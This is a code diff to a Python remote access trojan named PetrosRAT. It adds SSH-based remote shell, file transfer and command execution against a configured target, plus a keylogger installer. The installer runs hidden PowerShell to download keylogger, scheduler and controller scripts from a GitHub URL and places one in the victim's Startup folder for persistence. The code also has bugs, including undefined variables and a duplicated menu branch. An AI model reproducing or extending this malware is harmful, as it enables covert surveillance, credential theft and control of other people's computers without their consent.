@@ -42,6 +42,7 @@ options_menu = """
         
         [+] Options:
             [h] or [help]       -- Help Menu
+            [c] or [clear]      -- Clear UI
             [v] or [version]    -- Version Number
             [u] or [update]     -- Update PetrosRAT
             [r] or [remove]     -- Remove PetrosRAT
@@ -66,30 +67,16 @@ def read_config(config_file):
     # get target configurations
     configuration["IP ADDRESS"] = read_lines[0].strip()
     configuration["PASSWORD"] = read_lines[1].strip()
-    configuration["WORIKING DIRECTORY"] = read_lines[2].strip()
+    configuration["WORIKING DIRECTORY"] = (read_lines[2].replace("\\", "/")).strip()
+    configuration["STARTUP DIRECTORY"] = (read_lines[3].replace("\\", "/")).strip()
+    
     return configuration
 
 
 
-# detects os
-def os_detection():
-    # windows
-    if os.name == "nt":
-        return "w"
-    # other
-    if os.name == "posix":
-        return "l"
-
-
-# connects RAT to target
-def connect(ipv4, password):
-    # remotely connect
-    os.system(f"sshpass -p \"{password}\" ssh petrosrat@{ipv4} ")
-
-
-# terminates the programm
-def exit():
-    sys.exit()
+# clear screen
+def clear():
+    os.system("clear")
 
 # update the RAT
 def update():
@@ -144,6 +131,67 @@ def remove():
     if option == "n":
         main()
 
+# terminates the programm
+def exit():
+    sys.exit()
+
+# connects RAT to target
+def connect(ipv4, password):
+    # remotely connect
+    os.system(f"sshpass -p \"{password}\" ssh petrosrat@{ipv4} ")
+
+# upload a file remotely with scp
+def remote_upload(address, password, upload_file, path):
+    # scp upload
+    os.system(f"sshpass -p \"{password}\" scp {upload_file} petrosrat@{address}:{path}")
+
+# download a file remotely
+def remote_download(address, password, download_file, path):
+    # scp download
+    os.system(f"sshpass -p \"{password}\" scp -r petrosrat@{address}:{path} {local_path}")
+
+# run commands remotely
+def remote_command(address, password, command):
+    # remotely execute command
+    os.system(f"sshpass -p \"{password}\" ssh petrosrat@{address} '{command}' ")
+
+
+# keylogger
+def keylogger(address, password, target_username, working_directory):
+    
+    print("[+] Satrting Keylogger")
+    # set commands-web requests
+    keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/keylogger.ps1 -OutFile {working_directory}/keylogger.ps1\""
+    schedule_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/schedule.ps1 -OutFile {working_directory}/schedule.ps1\""
+    
+    controller_command = f'set "STARTUP=C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/controller.cmd -OutFile %STARTUP%'
+    # move_to_startup = f'powershell mv {working_directory}/controller.cmd "{startup}"'
+    print("[+] Keylogger Ready")
+    
+    # execute command
+    print("[*] Installing Keylogger")
+    remote_command(address, password, keylogger_command)
+    print("[*] Installing Scheduler")
+    remote_command(address, password, schedule_command)
+    print("[*] Installing Controller")
+    remote_command(address, password, controller_command)
+    # remote_command(address, password, move_to_startup)
+    
+    print("[+] Keylogger Installed Successfully")
+
+
+# detects os
+def os_detection():
+    # windows
+    if os.name == "nt":
+        return "w"
+    # other
+    if os.name == "posix":
+        return "l"
+
+
+
+
 
 # command line interface
 def cli(arguments):
@@ -167,15 +215,28 @@ def cli(arguments):
         ipv4 = configuration.get("IP ADDRESS")
         password = configuration.get("PASSWORD")
         working_directory = configuration.get("WORKING DIRECTORY")
+        startup_directory = configuration.get("STARTUP DIRECTORY")
+        target_username = working_directory[9:-19]
 
-
+        # enter option
+        if config_file == "":
+            main()
+        
         # remote console
         if config_file == "0":
             connect(ipv4, password)
-        
+            
+        #keylogger
+        elif config_file == "1":
+            keylogger(ipv4, password, target_username, working_directory)
+            
         # help me
         elif config_file == "h" or config_file == "help":
             main()
+
+        # clear UI
+        elif config_file == "h" or config_file == "help":
+            clear()
             
         # get version number
         elif config_file == "v" or config_file == "version":
